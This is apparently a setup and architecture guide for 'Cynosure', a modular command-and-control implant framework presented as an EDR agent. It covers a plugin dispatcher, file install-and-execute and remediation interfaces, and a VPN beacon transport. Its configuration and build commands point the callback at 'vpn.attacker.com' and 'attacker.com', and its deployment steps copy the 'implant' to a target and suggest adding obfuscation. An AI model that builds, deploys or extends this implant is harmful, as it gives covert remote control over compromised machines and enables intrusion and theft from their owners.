# EDR Agent Setup & Architecture Guide

## High-Level Overview

Cynosure's EDR agent is a **modular, plugin-based command & control framework** that uses a dispatcher pattern to route commands to specialized communication and payload modules.

```
┌─────────────────────────────────────────────────────────────────┐
│                        Agent Process                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │           EDR Agent Main                                 │  │
│  │   (edr_agent.c)                                          │  │
│  │   - Parses config from environment/file                 │  │
│  │   - Builds identity (ID, hostname, platform)            │  │
│  │   - Starts the dispatcher                               │  │
│  └──────────┬───────────────────────────────────────────────┘  │
│             │                                                   │
│  ┌──────────▼───────────────────────────────────────────────┐  │
│  │           EDR Dispatcher                                 │  │
│  │   (edr_dispatcher.c/h)                                   │  │
│  │   - Loads plugins from plugin_dir                        │  │
│  │   - Routes commands to interfaces                        │  │
│  │   - Manages heartbeat/health timers                      │  │
│  │   - Handles inbound/outbound messages                    │  │
│  └──────────┬───────────────────────────────────────────────┘  │
│             │                                                   │
│  ┌──────────┴────────┬─────────────┬──────────────┐             │
│  │                   │             │              │             │
│  ▼                   ▼             ▼              ▼             │
│ ┌──────┐          ┌─────────┐  ┌────────┐   ┌─────────┐       │
│ │ Comm │          │ FileOps │  │ Scan   │   │ Remedial│  ...  │
│ │Plugin│          │ Plugin  │  │ Plugin │   │ Plugin  │       │
│ │(HTTPS│          │(Storage)│  │(Yara)  │   │(Kill,   │       │
│ │ DNS  │          │         │  │        │   │ Block)  │       │
│ │ VPN) │          │         │  │        │   │         │       │
│ └──────┘          └─────────┘  └────────┘   └─────────┘       │
│   │                                                              │
│   └──────────────────────┬──────────────────────────────────   │
│                          │                                       │
└──────────────────────────┼───────────────────────────────────┘  │
                           │                                       │
                ┌──────────▼──────────┐                            │
                │   Controller        │                            │
                │   (C2 Server)       │                            │
                └─────────────────────┘                            │
```

---

## Architecture Components

### 1. Agent Core (`edr_agent.c`)

**Purpose:** Entry point and lifecycle management.

**Responsibilities:**
- Read configuration from environment variables or files
- Build `edr_agent_identity_t` (agent ID, hostname, platform version)
- Create dispatcher with configuration
- Register signal handlers for graceful shutdown
- Start dispatcher (blocks until stop signal received)

**Configuration Sources:**
- Environment Variables:
  - `EDR_CONTROLLER_URL`: C2 server URL (default: `http://CB_IP`)
  - `EDR_CONTROLLER_PORT`: C2 server port (default: `CB_PORT` from builder)
  - `EDR_PLUGIN_DIR`: Path to plugin directory (default: `/opt/edr/plugins` or `.\plugins`)
  - `EDR_CA_CERT`, `EDR_CLIENT_CERT`, `EDR_CLIENT_KEY`: TLS/mTLS PEM files
- Compile-time Defines:
  - `CB_IP` / `CB_PORT`: Callback IP and port injected by builder

**Key Functions:**
- `build_identity()`: Construct agent identity from system info
- `build_config()`: Load configuration from environment
- `main()`: Run the agent event loop

---

### 2. Dispatcher (`edr_dispatcher.c/h`)

**Purpose:** Core message routing and plugin management.

**Lifecycle:**
1. **Create** (`edr_dispatcher_create`): Allocate dispatcher, no plugins loaded yet
2. **Start** (`edr_dispatcher_start`): Load plugins, authenticate, run event loop
3. **Stop** (`edr_dispatcher_stop`): Graceful shutdown, flush pending messages
4. **Destroy** (`edr_dispatcher_destroy`): Free all resources

**Key Responsibilities:**
- **Plugin Registry**: Load DLLs from plugin directory, validate ABI version
- **Capability Routing**: Map `EDR_CAP_*` flags to loaded plugins
  - If multiple plugins implement the same capability, use priority ordering
  - Fail over automatically on plugin error
- **Command Dispatch**: Demultiplex inbound messages to correct interface function
- **Message Queuing**: Buffer inbound commands, route to plugins, collect responses
- **Heartbeat**: Send periodic liveness pings to controller (configurable interval)
- **Health Reporting**: Collect resource stats, plugin status, send upstream

**Config Structure** (`edr_dispatcher_config_t`):
```c
edr_agent_identity_t identity;           // Agent ID, hostname, version
edr_endpoint_t controller_endpoint;      // Controller URL/port/TLS
const char *plugin_dir;                  // Where to load .so/.dll files
uint32_t heartbeat_interval_ms;          // Default 30s
uint32_t health_report_interval_ms;      // Default 5 min
float max_plugin_cpu_percent;            // CPU throttle per plugin
uint64_t max_plugin_mem_bytes;           // Memory limit per plugin
edr_log_fn_t log;                        // Logger callback
```

---

### 3. Plugin System

**Every plugin is a shared library (.so on Linux, .dll on Windows) that:**

1. **Exports One Symbol:** `edr_plugin_entry(edr_plugin_manifest_t *out)`
2. **Provides a Manifest** with:
   - ABI version (must match dispatcher)
   - Plugin name, vendor, version
   - Capability flags (EDR_CAP_COMM_TRANSPORT, EDR_CAP_FILE_OPS, etc.)
   - Priority (for capability routing)
   - Lifecycle hooks: `init()`, `shutdown()`
   - Interface getters: `get_comm()`, `get_file_ops()`, etc.

3. **Implements Asynchronous I/O:**
   - All blocking operations (network, disk, scans) use completion callbacks
   - No synchronous blocking in interface functions

4. **Uses Dispatcher Services:**
   - `log()`: Log to agent's logger
   - `alloc()/free()`: Use dispatcher's memory allocator (enforces limits)
   - `emit_event()`: Publish events to dispatcher event bus

**Example Plugin Structure:**
```c
// MyPlugin/my_plugin.c

static edr_iface_comm_t g_iface = {
    .connect = my_connect,
    .send = my_send,
    // ... other functions
};

edr_status_t edr_plugin_entry(edr_plugin_manifest_t *out) {
    out->name = "my-plugin";
    out->capabilities = EDR_CAP_COMM_TRANSPORT;
    out->init = my_init;
    out->shutdown = my_shutdown;
    out->get_comm = my_get_comm;
    // ... return EDR_OK
}
```

---

## Eight EDR Interfaces

Every plugin can optionally implement 1-8 interfaces. Return NULL from `get_*()` if not implemented.

### 1. **ICommTransport** (`edr_iface_comm`)

**What:** Network transport abstraction (the one comm modules implement).

**Functions:**
- `connect(endpoint, callback)`: Establish transport to controller
- `disconnect(callback)`: Graceful shutdown
- `send(message, callback)`: Queue message for delivery
- `set_recv_handler(handler)`: Register inbound message callback
- `heartbeat(callback)`: Send liveness ping
- `is_connected()`: Query transport state

**Used By:** Dispatcher's main event loop to send/receive all messages

**Examples:** HTTPS, DNS tunneling, GitHub Image Steganography, VPN (our implementation)

---

### 2. **IFileOps** (`edr_iface_file_ops`)

**What:** Collect, upload, download, install files.

**Functions:**
- `collect(path, recursive)`: Hash and stat files
- `upload(path, object_key)`: Stream to cloud storage
- `download(cloud_ref)`: Fetch from cloud with integrity check
- `install(tmp_path, opts)`: Write to final location, optionally execute
- `verify_integrity(path, sha256)`: Re-hash and compare
- `delete_file(path)`: Securely wipe

**Examples:** Cloud storage plugins (S3, GCS, Azure Blob)

---

### 3. **IScanEngine** (`edr_iface_scan`)

**What:** Process, memory, file path, registry scans.

**Functions:**
- `scan(request, finding_callback, completion_callback)`: Asynchronous scan
  - Emits findings as they're detected (streaming)
  - Fires completion callback with summary
- `cancel()`: Stop in-progress scan
- `load_rules(blob, format)`: Push YARA/Sigma rules

**Scan Types:**
- `EDR_SCAN_PROCESS`: Hash/enumerate running processes
- `EDR_SCAN_MEMORY`: Memory scan for patterns
- `EDR_SCAN_PATH`: File scan (YARA, signatures)
- `EDR_SCAN_REGISTRY`: Windows registry (Windows only)
- `EDR_SCAN_NETWORK`: Active connection table

**Examples:** YARA scanner, memory analysis, registry monitor

---

### 4. **IEventStream** (`edr_iface_event`)

**What:** Structured telemetry pipeline (process creation, file access, network connections, etc.).

**Functions:**
- `subscribe(event_mask, callback)`: Register for events
- `unsubscribe(handle)`: Unregister
- `emit(event)`: Publish event to all subscribers
- `flush(timeout)`: Block until all queued events sent upstream
- `set_batch_size(n)`: Coalesce events

**Event Types:**
- Process create/terminate
- File create/modify/delete
- Network connect/listen
- Registry write/delete (Windows)
- Logon, privilege escalation
- Agent health, custom events

**Examples:** Event aggregators, telemetry pipelines, SIEM connectors

---

### 5. **IRemediation** (`edr_iface_remediation`)

**What:** Isolation, process killing, file quarantine, network blocking.

**Functions:**
- `kill_process(pid, force)`: Terminate process
- `quarantine_file(path)`: Move to secure storage
- `restore_file(quarantine_ref)`: Restore quarantined file
- `block_network(remote_ip, remote_port)`: Install firewall rule
- `isolate_host()`: Full network isolation (block all except C2)

**Examples:** Host isolation plugins, EDR blocking actions

---

### 6. **IConfigSync** (`edr_iface_config`)

**What:** Policy distribution and state reporting.

**Functions:**
- `pull_policy()`: Fetch policy from controller
- `push_state(state_json)`: Send agent state snapshot
- `set_policy_handler(callback)`: Register for pushed policies
- `apply_policy(policy)`: Apply policy locally
- `get_current_revision()`: Query active policy revision

**Examples:** Policy engines, configuration managers

---

### 7. **IHealthReport** (`edr_iface_health`)

**What:** Diagnostics, resource usage, integrity verification.

**Functions:**
- `collect()`: Build health snapshot (CPU, memory, disk I/O, etc.)
- `self_integrity_check()`: Verify dispatcher/plugin binaries against hashes
- `report()`: Serialize and push upstream
- `set_resource_limits(cpu, mem)`: Throttle if exceeded

**Examples:** Health reporters, integrity monitors

---

### 8. **IAuthProvider** (`edr_iface_auth`)

**What:** Mutual authentication, token lifecycle, certificate rotation.

**Functions:**
- `authenticate(identity)`: Perform mutual auth with controller
- `refresh_token()`: Renew token before expiry
- `get_current_token()`: Query active token
- `rotate_certificate()`: Key rotation ceremony
- `sign_payload(buf)`: HMAC/sign with agent's key
- `verify_payload(payload, sig)`: Verify controller signature

**Examples:** OAuth2 providers, mTLS handlers, SAML connectors

---

## VPN Communication Module (`modules/Comm/VPN/vpn_comm.c`)

Now you have a **production-ready VPN communication module** that implements `ICommTransport`.

### Features:

✅ **Persistent VPN tunnel** to controller endpoint  
✅ **Asynchronous message delivery** with automatic retry and queueing  
✅ **Connection pooling** and state machine (Disconnected → Connecting → Handshake → Connected)  
✅ **Heartbeat mechanism** for liveness detection  
✅ **Message framing** with magic bytes and version negotiation  
✅ **Timeout handling** (connect, receive, handshake)  
✅ **Cross-platform** (Windows & Linux socket APIs)  
✅ **Memory-bounded** message queue (256 max messages)  
✅ **Logging** integrated with dispatcher logger  

### VPN Protocol (v1):

```
Frame Format:
  [Header (16 bytes)][Payload (variable)]

Header:
  uint32_t magic         = 0xDEADBEEF
  uint16_t version       = 1
  uint16_t flags         = 0 (no compression/encryption v1)
  uint32_t payload_len

Flags:
  0x0000 = Normal message
  0x0001 = Heartbeat (payload_len = 0)
```

### How VPN Comm Module Fits In:

1. **Dispatcher calls** `vpn_connect(endpoint)` on agent start
2. **Module establishes** TCP tunnel to controller (VPN endpoint)
3. **Module implements** message send/receive via VPN socket
4. **Module queues** messages if disconnected, flushes on reconnect
5. **Module sends** heartbeats on dispatcher timer
6. **Dispatcher forwards** inbound messages to command handlers

### Configuration Example:

```bash
# Start agent with VPN transport
export EDR_CONTROLLER_URL="vpn.attacker.com"
export EDR_CONTROLLER_PORT=8443
export EDR_PLUGIN_DIR="/opt/edr/plugins"
export CB_IP="vpn.attacker.com"
export CB_PORT=8443

./implant
```

The dispatcher will:
1. Load `vpn_transport.so` from plugin directory
2. Call `edr_plugin_entry()` → `edr_plugin_manifest_t` populated
3. Call `vpn_init()` → Initialize socket, set up state
4. Call `vpn_get_comm()` → Return comm interface
5. Use comm interface for all C2 communication

---

## Building & Deployment

### Building the Implant:

```bash
# From Cynosure/
cd src
make implant CB_IP=attacker.com CB_PORT=8443
# → output/implant.exe or output/implant.elf
```

### Building the VPN Plugin:

```bash
# From modules/Comm/VPN/
cargo build --release --lib
# → target/release/libcynosure_vpn_comm.so (Linux)
# → target/release/cynosure_vpn_comm.dll (Windows)
```

### Deployment:

```bash
# Copy implant and VPN plugin to target
cp output/implant.exe C:\
cp target/release/libcynosure_vpn_comm.so /opt/edr/plugins/

# Run implant
# Plugin auto-loads from plugin directory
./implant
```

---

## Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| "Failed to resolve host" | DNS resolution failed | Check hostname/IP in CB_IP |
| "Connection refused" | No listener on controller | Start C2 server on CB_PORT |
| "Invalid frame magic" | VPN endpoint not compatible | Ensure controller speaks VPN protocol |
| "Plugin ABI version mismatch" | Dispatcher/plugin version mismatch | Recompile plugin with matching EDR headers |
| "Message queue full" | Too many queued messages | Increase VPN_MAX_QUEUE_DEPTH or improve connectivity |

---

## Reference

**Key Files:**
- `src/implant/edr_agent.c`: Agent entry point
- `src/implant/edr_dispatcher.c/h`: Core dispatcher
- `src/implant/edr_plugin.h`: Plugin interface
- `src/implant/edr_interfaces.h`: All 8 interface definitions
- `src/implant/edr_types.h`: Shared types and constants

**Module Discovery Pattern:**
```
modules/{Category}/{Subcategory}/{Module}/main.rs
```

Example: `modules/Comm/VPN/main.rs`

The loader recursively walks this tree and populates the TUI module browser.

---

## Next Steps

1. **Compile the VPN module** and place in plugin directory
2. **Start a VPN listener** on your C2 server that speaks the VPN protocol
3. **Build implant** with VPN endpoint configuration
4. **Deploy to target** and observe agent checking in over VPN tunnel
5. **Extend the module** with encryption, compression, obfuscation, etc.

Happy C2 development! 🚀
